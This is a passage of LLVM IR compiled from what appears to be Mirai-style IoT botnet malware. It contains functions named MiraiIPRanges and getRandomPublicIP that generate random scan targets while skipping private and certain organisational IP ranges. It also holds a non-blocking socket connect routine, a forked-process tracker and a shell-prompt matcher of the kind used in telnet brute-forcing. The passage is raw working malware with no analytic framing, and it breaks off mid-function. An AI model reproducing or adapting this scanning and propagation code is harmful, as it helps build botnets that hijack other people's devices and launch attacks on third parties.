  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #10
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #5, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #5
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #5
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #5
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.486, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

; <label>:46:                                     ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

; <label>:58:                                     ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

; <label>:70:                                     ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

; <label>:72:                                     ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

; <label>:96:                                     ; preds = %77
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11

; <label>:100:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %132, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %130, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  br i1 %21, label %130, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 100
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp sge i32 %28, 64
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp sle i32 %32, 127
  br i1 %33, label %130, label %34

; <label>:34:                                     ; preds = %30, %26, %22
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 127
  br i1 %37, label %130, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 169
  br i1 %41, label %42, label %46

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 254
  br i1 %45, label %130, label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 172
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %46
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp sle i32 %52, 16
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sle i32 %56, 31
  br i1 %57, label %130, label %58

; <label>:58:                                     ; preds = %54, %50, %46
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 192
  br i1 %61, label %62, label %70

; <label>:62:                                     ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %70

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 2
  br i1 %69, label %130, label %70

; <label>:70:                                     ; preds = %66, %62, %58
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 192
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %70
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 88
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 99
  br i1 %81, label %130, label %82

; <label>:82:                                     ; preds = %78, %74, %70
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 192
  br i1 %85, label %86, label %90

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 168
  br i1 %89, label %130, label %90

; <label>:90:                                     ; preds = %86, %82
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 198
  br i1 %93, label %94, label %102

; <label>:94:                                     ; preds = %90
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 18
  br i1 %97, label %130, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 19
  br i1 %101, label %130, label %102

; <label>:102:                                    ; preds = %98, %90
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 198
  br i1 %105, label %106, label %114

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 51
  br i1 %109, label %110, label %114

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 100
  br i1 %113, label %130, label %114

; <label>:114:                                    ; preds = %110, %106, %102
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 203
  br i1 %117, label %118, label %126

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 0
  br i1 %121, label %122, label %126

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 113
  br i1 %125, label %130, label %126

; <label>:126:                                    ; preds = %122, %118, %114
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp sge i32 %128, 224
  br label %130

; <label>:130:                                    ; preds = %126, %122, %110, %98, %94, %86, %78, %66, %54, %42, %34, %30, %18, %14
  %131 = phi i1 [ true, %122 ], [ true, %110 ], [ true, %98 ], [ true, %94 ], [ true, %86 ], [ true, %78 ], [ true, %66 ], [ true, %54 ], [ true, %42 ], [ true, %34 ], [ true, %30 ], [ true, %18 ], [ true, %14 ], [ %129, %126 ]
  br i1 %131, label %132, label %145

; <label>:132:                                    ; preds = %130
  %133 = call i32 @rand() #5
  %134 = srem i32 %133, 223
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = call i32 @rand() #5
  %137 = srem i32 %136, 255
  %138 = trunc i32 %137 to i8
  store i8 %138, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %139 = call i32 @rand() #5
  %140 = srem i32 %139, 255
  %141 = trunc i32 %140 to i8
  store i8 %141, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %142 = call i32 @rand() #5
  %143 = srem i32 %142, 255
  %144 = trunc i32 %143 to i8
  store i8 %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:145:                                    ; preds = %130
  %146 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %146, i8 0, i64 16, i32 16, i1 false)
  %147 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %148 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %149 = zext i8 %148 to i32
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %153 = zext i8 %152 to i32
  %154 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %155 = zext i8 %154 to i32
  %156 = call i32 (i8*, i8*, ...) @szprintf(i8* %147, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.487, i32 0, i32 0), i32 %149, i32 %151, i32 %153, i32 %155)
  %157 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %158 = call i32 @inet_addr(i8* %157) #5
  ret i32 %158
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @MiraiIPRanges() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %154, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %152, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %152, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %152, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %152, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 16
  br i1 %33, label %152, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  br i1 %37, label %152, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  br i1 %41, label %152, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 192
  br i1 %45, label %46, label %50

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 168
  br i1 %49, label %152, label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 172
  br i1 %53, label %54, label %62

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sge i32 %56, 16
  br i1 %57, label %58, label %62

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %60, 32
  br i1 %61, label %152, label %62

; <label>:62:                                     ; preds = %58, %54, %50
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 100
  br i1 %65, label %66, label %74

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sge i32 %68, 64
  br i1 %69, label %70, label %74

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %72, 127
  br i1 %73, label %152, label %74

; <label>:74:                                     ; preds = %70, %66, %62
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 169
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp sgt i32 %80, 254
  br i1 %81, label %152, label %82

; <label>:82:                                     ; preds = %78, %74
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 198
  br i1 %85, label %86, label %94

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sge i32 %88, 18
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %92, 20
  br i1 %93, label %152, label %94

; <label>:94:                                     ; preds = %90, %86, %82
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 224
  br i1 %97, label %152, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
